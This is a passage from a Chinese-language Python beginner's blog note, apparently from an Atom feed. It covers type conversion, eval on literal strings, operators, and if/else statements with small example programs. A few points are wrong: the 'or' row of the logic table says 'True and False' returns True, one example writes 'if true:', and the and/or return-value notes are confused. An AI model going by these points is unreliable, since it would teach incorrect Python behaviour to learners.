class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">num1</span>=1</span><br><span class="line"><span class="attribute">str0</span>=<span class="string">'10'</span></span><br><span class="line"><span class="builtin-name">print</span>(type(float(num1)))#&lt;class <span class="string">'float'</span>&gt;</span><br><span class="line"><span class="builtin-name">print</span>(float(num1))#1.0    转换成浮点型 小数点后多了个 0 以示区别</span><br><span class="line"><span class="builtin-name">print</span>(float(str0))#10.0   字符串类型  也可以转化为  浮点型</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#tuple():将一个序列转化成元组</span></span><br><span class="line">list1=[10,20,30]</span><br><span class="line"><span class="builtin-name">print</span>(tuple(list1))#(10, 20, 30)</span><br><span class="line"><span class="comment">#list():将一个元组转化成列表</span></span><br><span class="line">t1=(100,200,300)</span><br><span class="line"><span class="builtin-name">print</span>(list(t1))#[100, 200, 300]</span><br><span class="line"><span class="comment">#eval():计算在字符串中的有效Python表达式，并返回一个对象</span></span><br><span class="line"><span class="attribute">str1</span>=<span class="string">'1'</span></span><br><span class="line"><span class="attribute">str2</span>=<span class="string">'1.1'</span></span><br><span class="line"><span class="attribute">str3</span>=<span class="string">'(100,200,300)'</span></span><br><span class="line"><span class="builtin-name">print</span>(eval(str1))</span><br><span class="line"><span class="builtin-name">print</span>(type(eval(str2)))</span><br><span class="line"><span class="builtin-name">print</span>(eval(str3))</span><br><span class="line"><span class="comment"># 1</span></span><br><span class="line"><span class="comment"># 1.1</span></span><br><span class="line"><span class="comment"># (100, 200, 300)</span></span><br></pre></td></tr></table></figure><p>对了，python交互模式直接在PyCharm下端 点击PyDev console即可进入，若清空，里面的输入历史必须关闭工程才可以，一般不需要清楚。</p><h2 id="运算符的分类"><a href="#运算符的分类" class="headerlink" title="运算符的分类"></a>运算符的分类</h2><ul><li>算数运算符<blockquote><p>优先级的排序：()高于*<em>(指数)高于</em>，/，//，%，高于+，-</p></blockquote></li><li>赋值运算符</li><li>复合赋值运算符</li></ul><table><thead><tr><th>运算符</th><th>描述</th><th>实例</th></tr></thead><tbody><tr><td>+=</td><td>加法赋值运算符</td><td>c+=a 等价于c=c+a</td></tr><tr><td>-=</td><td></td><td></td></tr><tr><td>*=</td><td></td><td></td></tr><tr><td>/=</td><td>除法赋值运算符</td><td>c/=a等价于 c=c/a</td></tr><tr><td>//=</td><td>整数赋值运算符</td><td>c//=a等价于 c=c//a</td></tr><tr><td>%=</td><td></td><td></td></tr><tr><td>**=</td><td>幂赋值运算符</td><td>c<strong>=a 等价与 c=c</strong>a  c的a次方</td></tr><tr><td>&gt; 先算符合符合运算符右侧的表达式，再算符合运算符运算的算数运算，最后算赋值运算</td><td></td><td></td></tr></tbody></table><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">d=<span class="number">10</span></span><br><span class="line">d*=<span class="number">1</span>+<span class="number">2</span>   #相当于 d*=(<span class="number">1</span>+<span class="number">2</span>)</span><br></pre></td></tr></table></figure><ul><li><p>比较运算符</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span> ==</span><br><span class="line"><span class="number">2.</span> !=</span><br><span class="line"><span class="number">3.</span> &gt;</span><br><span class="line"><span class="number">4.</span> &lt;</span><br><span class="line"><span class="number">5.</span> &gt;=</span><br><span class="line"><span class="number">6.</span> &lt;=</span><br></pre></td></tr></table></figure></li><li><p>逻辑运算符</p></li></ul><table><thead><tr><th>运算符</th><th>逻辑表达式</th><th>描述</th><th>实例</th></tr></thead><tbody><tr><td>and</td><td>x and y</td><td>布尔”与” if x为flase，x and y返回 false 否则返回 y的值</td><td>True and False，返回 False</td></tr><tr><td>or</td><td>x or y</td><td>布尔”或” if x为True，x and y返回 True 否则返回 y的值</td><td>True and False，返回 True</td></tr><tr><td>not</td><td>not</td><td>布尔”非” if x为True，not x 返回 False。</td><td>not True 返回 False</td></tr></tbody></table><blockquote><p>注意 与操作 是与 并且 都不非零则返回最后一个非零数</p></blockquote><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">2 </span><span class="keyword">and</span> <span class="number">1</span> =<span class="number">1</span></span><br><span class="line"><span class="symbol">1 </span><span class="keyword">and</span> <span class="number">2</span> =<span class="number">2</span></span><br></pre></td></tr></table></figure><blockquote><p>注意 或操作 是与 并且 都不非零则返回第一一个非零数</p></blockquote><figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">2 </span><span class="keyword">or</span> <span class="number">1</span> =<span class="number">2</span></span><br><span class="line"><span class="symbol">1 </span><span class="keyword">or</span> <span class="number">2</span> =<span class="number">1</span></span><br></pre></td></tr></table></figure><blockquote><p>最后拓个展</p></blockquote><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#多个变量赋值   数量位置要对应相等</span></span><br><span class="line">num1,float1,<span class="attribute">str1</span>=10,0.5,'hello,world'</span><br><span class="line"><span class="builtin-name">print</span>(num1)</span><br><span class="line"><span class="builtin-name">print</span>(float1)</span><br><span class="line"><span class="builtin-name">print</span>(str1)</span><br><span class="line"><span class="comment">#10</span></span><br><span class="line"><span class="comment">#0.5</span></span><br><span class="line"><span class="comment">#hello,world</span></span><br></pre></td></tr></table></figure><h1 id="循环"><a href="#循环" class="headerlink" title="循环"></a>循环</h1><h4 id="1-条件语句作用"><a href="#1-条件语句作用" class="headerlink" title="1. 条件语句作用"></a>1. 条件语句作用</h4><h3 id="2-if-语法"><a href="#2-if-语法" class="headerlink" title="2. if 语法"></a>2. if 语法</h3><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> <span class="literal">true</span>:</span><br><span class="line">    <span class="builtin-name">print</span>(<span class="string">'条件成立执行的代码1'</span>)</span><br><span class="line">    <span class="builtin-name">print</span>(<span class="string">'条件成立执行的代码2'</span>)</span><br><span class="line"><span class="comment">#下面的代码没有缩进到if 语句块，所以和if 条件无关</span></span><br><span class="line"><span class="builtin-name">print</span>(<span class="string">'我是无论条件是否成立都要执行的代码'</span>)</span><br></pre></td></tr></table></figure><h3 id="3-if…else…"><a href="#3-if…else…" class="headerlink" title="3. if…else…"></a>3. if…else…</h3><figure class="highlight vala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#系统输入用户年龄，用这个年龄来做一傲剑判断</span></span><br><span class="line"><span class="meta">#1.用户输入</span></span><br><span class="line"><span class="meta">#2.保存用户输入的年龄</span></span><br><span class="line"><span class="meta">#3.if</span></span><br><span class="line"><span class="meta">#注意：input()接收到的数据是str类型，不能与 整数18作比较--int()转换类型</span></span><br><span class="line"></span><br><span class="line">age=<span class="keyword">int</span>(input(<span class="string">"请输入您的年龄："</span>))</span><br><span class="line"><span class="keyword">if</span> age&gt;=<span class="number">18</span>:</span><br><span class="line">    print(f<span class="string">'您的年龄是&#123;age&#125;，已经成年，可以上网'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    print(f<span class="string">'您的年龄是&#123;age&#125;，小朋友，作业写完了没！'</span>)</span><br></pre></td></tr></table></figure><h3 id="4-多重判断"><a href="#4-多重判断" class="headerlink" title="4. 多重判断"></a>4. 多重判断</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">age = int(input(<span class="string">'请输入你的年龄：'</span>))</span><br><span class="line"><span class="keyword">if</span> age &lt;<span class="number">18</span>:</span><br><span class="line">    print(<span class="string">f'你的年龄是<span class="subst">&#123;age&#125;</span>，童工一枚'</span>)</span><br><span class="line"><span class="keyword">elif</span> (age&gt;=<span class="number">18</span>)<span class="keyword">and</span>(age&lt;=<span class="number">60</span>):</span><br><span class="line">    print(<span class="string">f'你的年龄是<span class="subst">&#123;age&#125;</span>，合法工龄'</span>)</span><br><span class="line"><span class="keyword">elif</span> age&gt;<span class="number">60</span>:</span><br><span class="line">    print(<span class="string">f'你的年龄是<span class="subst">&#123;age&#125;</span>，可以退休'</span>)</span><br></pre></td></tr></table></figure><blockquote><p>多重判断也可以和else 配合使用。一般else放在整个if 语句的最后，表示以上条件都不成立的时候，执行的代码！</p></blockquote><h3 id="5-if-嵌套"><a href="#5-if-嵌套" class="headerlink" title="5. if 嵌套"></a>5. if 嵌套</h3><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">money</span>=0</span><br><span class="line"><span class="attribute">seat</span>=1</span><br><span class="line"><span class="keyword">if</span> money ==1:</span><br><span class="line">    <span class="builtin-name">print</span>(<span class="string">'土豪，请上车！'</span>)</span><br><span class="line">    #判断能否坐下</span><br><span class="line">    <span class="keyword">if</span> seat ==1:</span><br><span class="line">        <span class="builtin-name">print</span>(<span class="string">'有空坐，请坐！'</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="builtin-name">print</span>(<span class="string">'暂时没有空座，站着等会！'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="builtin-name">print</span>(<span class="string">'朋友，出门要记得带钱啊！'</span>)</span><br></pre></td></tr></table></figure><h3 id="6-综合实例"><a href="#6-综合实例" class="headerlink" title="6. 综合实例"></a>6. 综合实例</h3><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">import random</span><br><span class="line">player = int(input(<span class="string">'请出拳：0--石头；1--剪刀；2--布'</span>))</span><br><span class="line">computer = random.randint(0,2)#导入模块，使用这个模块中的功能 (0,2)前后都包括</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>((<span class="attribute">player</span>==0)and(computer==1) <span class="keyword">or</span>(<span class="attribute">player</span>==1)and(computer==2) <span class="keyword">or</span> (<span class="attribute">player</span>==2)and(computer==0) ):</span><br><span class="line">    <span class="builtin-name">print</span>(<span class="string">'玩家获胜，哈哈哈'</span>)</span><br><span class="line">elif player ==computer:</span><br><span class="line">    <span class="builtin-name">print</span>(<span class="string">'平局，别走，再来一局'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="builtin-name">print</span>(<span class="string">'电脑获胜！'</span>)</span><br><span class="line"><span class="comment">#这里有个随机的做法</span></span><br><span class="line"><span class="comment">#1.导出random模块   import 模块名</span></span><br><span class="line"><span class="comment">#2.使用random模块中的功能 randint(开始，结束)</span></span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2019/07/23/eAZRsg.jpg" alt="eAZRsg.jpg"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;其实，今天让我心里感到安慰的是  学会了使用idc dump数据！但明天再整理吧！&lt;/p&gt;
    
    </summary>
    
    
      <category term="python" scheme="http://yoursite.com/tags/python/"/>
    
  </entry>
  
</feed>
